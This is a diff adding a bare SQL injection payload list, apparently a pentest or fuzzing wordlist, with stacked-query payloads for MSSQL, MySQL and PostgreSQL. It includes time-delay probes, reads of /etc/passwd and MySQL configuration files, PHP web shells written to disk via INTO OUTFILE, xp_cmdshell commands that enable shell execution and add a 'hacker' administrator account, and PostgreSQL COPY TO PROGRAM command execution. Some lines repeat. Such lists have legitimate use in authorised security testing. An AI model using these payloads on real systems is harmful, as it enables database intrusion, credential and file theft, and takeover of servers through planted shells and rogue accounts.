@@ -1,0 +1,171 @@
+';SELECT 1--
+';SELECT user()--
+';SELECT database()--
+';WAITFOR DELAY '0:0:5'--
+';SELECT pg_sleep(5)--
+';SELECT SLEEP(5)--
+';SELECT version()--
+';SELECT @@version--
+';EXEC xp_cmdshell 'whoami'--
+';SELECT LOAD_FILE('/etc/passwd')--
+
+';SELECT 1--
+';SELECT 1;--
+';SELECT user()--
+';SELECT database()--
+
+';SELECT version()--
+
+';SELECT @@version--
+
+';SELECT current_user--
+
+';SELECT system_user--
+
+';SELECT 1;SELECT 2--
+
+';SELECT database();SELECT user()--
+
+';SELECT user();SELECT version()--
+
+';SELECT 1;WAITFOR DELAY '0:0:5'--
+
+';WAITFOR DELAY '0:0:5'--
+
+';WAITFOR DELAY '0:0:10'--
+
+';SELECT 1;WAITFOR DELAY '0:0:3'--
+
+';SELECT pg_sleep(5)--
+
+';SELECT pg_sleep(10)--
+
+';SELECT 1;SELECT pg_sleep(5)--
+
+';SELECT 1;SELECT pg_sleep(10)--
+
+';SELECT SLEEP(5)--
+
+';SELECT SLEEP(10)--
+
+';SELECT 1;SELECT SLEEP(5)--
+
+';SELECT 1;SELECT SLEEP(10)--
+
+';SELECT @@datadir--
+
+';SELECT @@hostname--
+
+';SELECT @@version_compile_os--
+
+';SELECT user();SELECT database()--
+
+';SELECT schema_name FROM information_schema.schemata--
+
+';SELECT table_name FROM information_schema.tables--
+
+';SELECT column_name FROM information_schema.columns--
+
+';CREATE TABLE test_table(id int)--
+
+';DROP TABLE test_table--
+
+';INSERT INTO test_table VALUES(1)--
+
+';UPDATE test_table SET id=2--
+
+';DELETE FROM test_table--
+
+';SELECT 1 INTO OUTFILE '/tmp/test.txt'--
+
+';SELECT '<?php phpinfo();?>' INTO OUTFILE '/tmp/shell.php'--
+
+';SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE '/tmp/cmd.php'--
+
+';EXEC xp_cmdshell 'whoami'--
+
+';EXEC xp_cmdshell 'dir'--
+
+';EXEC xp_cmdshell 'ipconfig'--
+
+';EXEC xp_cmdshell 'ping 127.0.0.1'--
+
+';EXEC xp_cmdshell 'net user'--
+
+';EXEC xp_cmdshell 'net user hacker P@ss123 /add'--
+
+';EXEC xp_cmdshell 'net localgroup administrators hacker /add'--
+
+';EXEC master..xp_cmdshell 'whoami'--
+
+';EXEC master..xp_cmdshell 'dir'--
+
+';EXEC master..xp_cmdshell 'ipconfig'--
+
+';EXEC master..xp_cmdshell 'ping google.com'--
+
+';DECLARE @q varchar(100);SET @q='whoami';EXEC xp_cmdshell @q--
+
+';EXEC sp_configure 'show advanced options',1--
+
+';RECONFIGURE--
+
+';EXEC sp_configure 'xp_cmdshell',1--
+
+';RECONFIGURE--
+
+';EXEC xp_cmdshell 'whoami > C:\temp\pwned.txt'--
+
+';EXEC xp_cmdshell 'powershell -c whoami'--
+
+';SELECT LOAD_FILE('/etc/passwd')--
+
+';SELECT LOAD_FILE('/etc/hosts')--
+
+';SELECT LOAD_FILE('/etc/mysql/my.cnf')--
+
+';SELECT LOAD_FILE('C:\Windows\win.ini')--
+
+';SELECT LOAD_FILE('C:\Windows\System32\drivers\etc\hosts')--
+
+';COPY (SELECT '') TO PROGRAM 'id'--
+
+';COPY (SELECT '') TO PROGRAM 'whoami'--
+
+';COPY (SELECT '') TO PROGRAM 'uname -a'--
+
+';COPY (SELECT '') TO PROGRAM 'ping -c 1 127.0.0.1'--
+
+';DO $$BEGIN PERFORM pg_sleep(5); END$$--
+
+';DO $$BEGIN PERFORM pg_sleep(10); END$$--
+
+';SELECT pg_read_file('/etc/passwd')--
+
+';SELECT pg_read_file('/etc/hosts')--
+
+';SELECT pg_ls_dir('.')--
+
+';SELECT pg_ls_dir('/etc')--
+
+';SELECT pg_ls_dir('/var/www')--
+
+';SELECT current_database()--
+
+';SELECT current_schema()--
+
+';SELECT inet_server_addr()--
+
+';SELECT inet_server_port()--
+
+';SELECT version();SELECT current_user--
+
+';SELECT current_user;SELECT current_database()--
+
+';SELECT now()--
+
+';SELECT clock_timestamp()--
+
+';SELECT pg_postmaster_start_time()--
+
+';SELECT pg_is_in_recovery()--
